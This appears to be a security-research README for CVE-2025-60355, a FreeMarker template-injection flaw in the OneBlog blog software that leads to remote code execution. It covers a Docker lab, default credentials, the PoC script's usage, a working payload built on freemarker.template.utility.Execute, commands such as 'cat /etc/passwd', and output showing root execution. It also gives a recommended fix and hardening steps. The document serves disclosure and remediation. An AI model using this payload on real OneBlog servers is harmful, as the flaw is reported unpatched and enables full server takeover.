# CVE-2025-60355 - OneBlog FreeMarker SSTI to Remote Code Execution

> **Exploit Intelligence Platform** | [exploit-intel.com](https://exploit-intel.com) | [@exploit_intel](https://x.com/exploit_intel) | dev@exploit-intel.com

## Vulnerability Summary

| Field | Value |
|---|---|
| CVE | CVE-2025-60355 |
| Component | [OneBlog](https://github.com/zhangyd-c/OneBlog) |
| Type | CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine |
| CVSS | 9.8 (Critical) - `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| EPSS | 0.1% (21.8th percentile) |
| Affected | All versions up to and including 2.3.9 (fix claim is incomplete) |
| Claimed Fix | v2.3.9 - commit `ac1c801f06a595dab6d3a9c26d4a130b0ca5fac2` |
| Author | Exploit Intelligence Platform (dev@exploit-intel.com) |
| Date | 2026-02-27 |

## Vulnerability Details

CVE-2025-60355 is a critical Server-Side Template Injection (SSTI) vulnerability in OneBlog. An authenticated admin can inject FreeMarker directives into stored templates (for example `TM_ROBOTS`) through `POST /template/edit`. Those templates are rendered by public endpoints like `/robots.txt` without sandboxing, allowing unauthenticated trigger of remote code execution.

### Root Cause

The vulnerability resides in `FreeMarkerUtil.template2String()` at `blog-core/src/main/java/com/zyd/blog/util/FreeMarkerUtil.java` (lines 77–81). This method creates a FreeMarker `Configuration` object **without restricting the `TemplateClassResolver`**:

```java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_22);
cfg.setNumberFormat("#");
// MISSING: cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);
t = new Template("", new StringReader(templateContent), cfg);
StringWriter writer = new StringWriter();
t.process(newMap, writer);
```

By default, FreeMarker's `?new()` built-in allows instantiation of **any class** implementing `TemplateModel`. The `freemarker.template.utility.Execute` class implements `TemplateMethodModel`, and its `exec()` method calls `Runtime.exec()` to run arbitrary OS commands. Template content is stored in the `sys_template` database table and injected via the admin-only `POST /template/edit` endpoint, but **rendered by unauthenticated public endpoints** (`/robots.txt`, `/sitemap.xml`, etc.) served by the blog-web service.

The attack chain exploits a split-service architecture: injection happens on `blog-admin` (port 8085, authenticated), and execution is triggered on `blog-web` (port 8443, unauthenticated). The payload persists in the database and executes on subsequent requests to affected endpoints.

## Lab Setup

### Prerequisites

- Docker Engine with Compose plugin (`docker compose`)
- ~1 GB disk space for images
- Ports 8085 and 8443 available on the host

### Build and Start

```bash
cd CVE-2025-60355
docker compose build
docker compose up -d
```

> **Note:** Java applications take 20–30 seconds to fully initialize after container start. Wait for logs to show "博客部署完成" before testing.

### Verify Services Are Running

```bash
docker compose ps
```

### Container Roles

| Container | Image | Port | Role |
|-----------|-------|------|------|
| `cve-60355-redis` | `redis:7-alpine` | 6379 (internal) | Shiro session management and caching |
| `cve-60355-mysql` | `cve-60355-mysql` (MariaDB 10.11) | 3306 (internal) | Database — schema, users, templates, permissions |
| `cve-60355-admin` | `cve-60355-admin` (Temurin JRE 8) | **8085** → host | Admin backend — `POST /passport/signin` (auth), `POST /template/edit` (injection) |
| `cve-60355-web` | `cve-60355-web` (Temurin JRE 8) | **8443** → host | Public frontend — `GET /robots.txt` (trigger, unauthenticated) |

### Default Credentials

| Username | Password | Role | Has `template:edit`? |
|----------|----------|------|---------------------|
| `root` | `123456` | ROOT (superadmin) | ✅ Yes |
| `admin` | `123456` | ADMIN | Yes |
| `comment-admin` | `123456` | COMMENT ADMIN | No |

### Stop / Reset

```bash
# Stop the lab
docker compose down

# Full reset (including database volumes)
docker compose down -v
```

## PoC Usage

### Script Location

```
poc/poc.py
```

**Language:** Python 3 (stdlib only — no external dependencies)

### Quick Start (Lab Environment)

First, get the container IPs:

```bash
ADMIN_IP=$(docker inspect cve-60355-admin --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
WEB_IP=$(docker inspect cve-60355-web --format '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}')
```

Run the exploit:

```bash
# Default command (id)
python3 poc/poc.py "$ADMIN_IP" 8085 "$WEB_IP" 8443

# Custom command
python3 poc/poc.py "$ADMIN_IP" 8085 "$WEB_IP" 8443 "cat /etc/passwd"

# System info
python3 poc/poc.py "$ADMIN_IP" 8085 "$WEB_IP" 8443 "uname -a"
```

### Syntax

```
python3 poc.py <admin_host> <admin_port> <web_host> <web_port> [command]
```

| Parameter | Default | Description |
|-----------|---------|-------------|
| `admin_host` | `172.20.0.4` | blog-admin container IP (injection point) |
| `admin_port` | `8085` | blog-admin HTTP port |
| `web_host` | `172.20.0.5` | blog-web container IP (trigger point) |
| `web_port` | `8443` | blog-web HTTP port |
| `command` | `id` | OS command to execute |

### Attack Flow

```
┌──────────────┐    Step 1: POST /passport/signin     ┌──────────────┐
│              │ ─────────────────────────────────────►│ blog-admin   │
│              │    (root / 123456)                    │ :8085        │
│              │                                       │              │
│  Attacker    │    Step 2: POST /template/edit        │              │──► MySQL
│              │ ─────────────────────────────────────►│              │    (shared DB)
│              │    (SSTI payload in TM_ROBOTS)        ├──────────────┤
│              │                                       │ blog-web     │
│              │    Step 3: GET /robots.txt             │ :8443        │
│              │ ─────────────────────────────────────►│              │
│              │◄── RCE output in HTTP response        │              │
└──────────────┘                                       └──────────────┘
                                                            │
                                                            ▼
                                                        Redis (sessions)
```

### SSTI Payload

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("COMMAND")}
```

This payload uses FreeMarker's `?new()` built-in to instantiate `freemarker.template.utility.Execute`, which calls `Runtime.exec()` with the attacker-supplied command. The command output is rendered directly into the HTTP response body.

## Verification: Vulnerable vs Patched

### Vulnerable Version (OneBlog 2.3.8) — RCE Confirmed ✅

```
$ python3 poc.py 172.20.0.4 8085 172.20.0.5 8443 id

======================================================================
  CVE-2025-60355: OneBlog FreeMarker SSTI → Remote Code Execution
  Affected: OneBlog < 2.3.9 (zhangyd-c)
  CVSS: 9.8 CRITICAL | CWE-1336 (Template Injection)
======================================================================

[*] Step 1: Authenticating to blog-admin at 172.20.0.4:8085
    [+] Authentication successful! (HTTP 200)

[*] Step 2: Injecting SSTI payload into TM_ROBOTS template (id=4)
    Payload: <#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
    [+] Template injection successful! (HTTP 200)

[*] Step 3: Triggering RCE via GET /robots.txt at 172.20.0.5:8443
    [+] HTTP 200
    [+] Response body:
    ──────────────────────────────────────────────────
    │ uid=0(root) gid=0(root) groups=0(root)
    ──────────────────────────────────────────────────

[*] Cleanup: Restoring original TM_ROBOTS template
    [+] Original template restored.

======================================================================
  [✓] EXPLOIT SUCCESSFUL — Remote Code Execution confirmed!
  [✓] Command output: uid=0(root) gid=0(root) groups=0(root)
======================================================================
```

### Additional Test Cases

| Command | Output | Status |
|---------|--------|--------|
| `id` | `uid=0(root) gid=0(root) groups=0(root)` | ✅ RCE as root |
| `cat /etc/hostname` | `cve-60355-web` | ✅ File read |
| `uname -a` | `Linux cve-60355-web 6.12.68-linuxkit ...` | ✅ System info |

### Patched Version (OneBlog 2.3.9)

> **⚠️ Important Finding:** The version labeled as "patched" (2.3.9, commit `ac1c801`) does **not** actually fix the vulnerability. The `FreeMarkerUtil.java` file was never modified between v2.3.8 and v2.3.9. The commit contains only version bumps, article table refactoring, and JavaScript asset updates — no security fix was applied. The SSTI vulnerability remains exploitable in v2.3.9 and at HEAD.

## Fix

### Upstream Fix Status: ⚠️ INCOMPLETE

The fix commit (`ac1c801f06a595dab6d3a9c26d4a130b0ca5fac2`, tagged `:bookmark: 发布 2.3.9`) does **not** address the SSTI vulnerability. The commit contains:

- Version bumps across all `pom.xml` files (2.3.8 → 2.3.9)
- Article look-count table refactoring
- WangEditor JavaScript assets
- SQL schema updates

**`FreeMarkerUtil.java` was NOT modified.** The unsandboxed `Configuration` creation remains present at HEAD.

### Recommended Fix

Add a `TemplateClassResolver` restriction in `FreeMarkerUtil.template2String()` at line 78:

```java
Configuration cfg = new Configuration(Configuration.VERSION_2_3_22);
cfg.setNumberFormat("#");
cfg.setNewBuiltinClassResolver(TemplateClassResolver.ALLOWS_NOTHING_RESOLVER);  // ADD THIS LINE
t = new Template("", new StringReader(templateContent), cfg);
```

`ALLOWS_NOTHING_RESOLVER` completely prevents the `?new()` built-in from instantiating any classes, eliminating the SSTI → RCE attack vector.

### Additional Hardening

1. **Disable `?api` built-in**: Set `api_builtin_enabled` to `false` to prevent direct Java API access via templates
2. **Input sanitization**: Validate/sanitize template content on the `POST /template/edit` endpoint before storing to the database
3. **Least privilege**: Run the Java applications as a non-root user inside containers
4. **Change default credentials**: The default `root`/`123456` credentials make the authentication barrier trivially bypassable

## Files

| File | Description |
|---|---|
| `poc/poc.py` | Primary SSTI to RCE proof-of-concept against vulnerable OneBlog |
| `poc/bypass_poc.py` | Multi-vector bypass validation showing v2.3.9 remains exploitable |
| `docker-compose.yml` | Vulnerable lab stack |
| `docker-compose.patched.yml` | Claimed patched stack for comparison |
| `Dockerfile.admin` / `Dockerfile.web` / `Dockerfile.mysql` | Vulnerable service images |
| `Dockerfile.admin-patched` / `Dockerfile.web-patched` / `Dockerfile.builder-patched` | Patched comparison images |

## References

| Resource | URL |
|----------|-----|
| **NVD** | https://nvd.nist.gov/vuln/detail/CVE-2025-60355 |
| **GHSA** | https://github.com/advisories/GHSA-q7cx-22m3-64gr |
| **Exploit Writeup** | https://github.com/line2222/vuln/issues/4 |
| **Source Repository** | https://github.com/zhangyd-c/OneBlog |
| **Vulnerable Commit** | `8669276` (v2.3.8) |
| **"Fix" Commit** | `ac1c801f06a595dab6d3a9c26d4a130b0ca5fac2` (v2.3.9, incomplete) |
| **Online Docs** | https://docs.zhyd.me |

## Timeline

| Date | Event |
|------|-------|
| 2025-10-28 | CVE-2025-60355 published |
| Unknown | OneBlog v2.3.9 released (claimed fix — incomplete) |
| Unknown | Vulnerability reported via https://github.com/line2222/vuln/issues/4 |

## Disclaimer

This proof-of-concept is provided for **authorized security research and educational purposes only**. It is intended to help security professionals and system administrators understand, verify, and remediate CVE-2025-60355 in controlled lab environments.

**Do not use this tool against systems you do not own or have explicit written authorization to test.** Unauthorized access to computer systems is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws worldwide.

The authors assume no liability for misuse of this material. By using this PoC, you agree to:

- Only test against systems you own or have written permission to test
- Comply with all applicable local, state, national, and international laws
- Report any newly discovered vulnerabilities responsibly to the affected vendor
- Not use this tool for malicious purposes, unauthorized access, or any illegal activity

This project follows responsible disclosure practices. The vulnerability was publicly disclosed via the CVE program and GitHub Security Advisory (GHSA-q7cx-22m3-64gr) prior to this PoC being developed.
